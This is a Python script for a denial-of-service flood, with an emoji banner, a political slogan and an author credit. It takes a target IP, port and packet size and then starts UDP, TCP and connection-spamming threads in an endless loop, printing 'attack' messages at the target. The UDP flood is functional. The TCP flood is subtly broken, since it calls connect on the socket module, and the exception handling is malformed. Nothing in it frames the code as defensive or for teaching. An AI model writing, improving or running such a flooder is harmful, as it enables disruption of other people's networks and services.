#!usr/bin/python
# _*_ coding: utf-8 _*_
import os
import socket
import sys
import time
import threading
import string
import random
 
# Color
class bcolors:
    Z = '\033[97m'
    H = '\033[95m'
    A = '\033[94m'
    N = '\033[96m'
    WARNING = '\033[93m'
    A = '\033[92m'
    H = '\033[31m'
    M = '\033[32m'
    A = '\033[33m'
    D = '\033[91m'
    RESET = '\033[0m'
    g = '\033[1m'
    g = '\033[4m'
    
os.system('clear')
print(" ")
print("        🔴 🔴    🔴           🔴      🔴 🔴        🔴 🔴 🔴             ")      
print("     🔴       🔴   🔴       🔴     🔴       🔴   🔴                       ")
print("    🔴         🔴     🔴  🔴      🔴         🔴  🔴                       ")
print("    ⚫         ⚫      ⚫⚫       ⚫         ⚫  🔴                       ")
print("    ⚫         ⚫       ⚫        ⚫         ⚫    ⚫ ⚫ ⚫            ")
print("    🟠   🟠 🟠 🟠       🟠        🟠   🟠 🟠 🟠            🟠           ")
print("    🟠         🟠       🟠        🟠         🟠            🟠          ")
print("    🟠         🟠       🟠        🟠         🟠    🟠 🟠 🟠             ")  
print("\033[91m===================≠======≠==============================≠======\033[0m")
print("\033[33m                BIRRUH  BIDDAM  NAFDHIKA YAA AQSHA                 \033[0m")
print("\033[33m                          design By: Za'99                         \033[0m") 
print("\033[33m                                |                                  \033[0m")
print("\033[33m                            --oO0Oo--                               \033[0m")
print("\033[91m=================≠==============================================\033[0m") 
if len(sys.argv) < 4:
    sys.exit("\033[97mUsage: python "+sys.argv[0]+" <ip> <port> <size>\033[0m")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])
time.sleep(5),
print("\033[96m                         ⟩⟩  P \033[0m "),
time.sleep(5),
print("\033[92m                         ⟩⟩  E \033[0m "),
time.sleep(5),
print("\033[1m                         ⟩⟩  A \033[0m "),
time.sleep(5),
print("\033[97m                         ⟩⟩  C \033[0m "),
time.sleep(5),
print("\033[95m                         ⟩⟩  E \033[0m "),
time.sleep(5),
class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        u.start()
        print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m::. " +ip+ " \033[0m" )
        t = tcp(ip,port,size,packets)
        t.start()
        print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m:::.. " +ip+ " \033[0m" )
        s = syn(ip,port,packets)
        s.start()
        print("\033[33m[\033[1m+\033[33m]\033[92mRequest " +str()+ "  \033[33mto Sent attack \033[97m::::... " +ip+ " \033[0m" )
    except KeyboardInterrupt:
        print ("Stopping Flood!")
        sys.exit()
    except ('socket.error, msg'):
        print ("Socket Couldn't Connect")
        sys.exit()
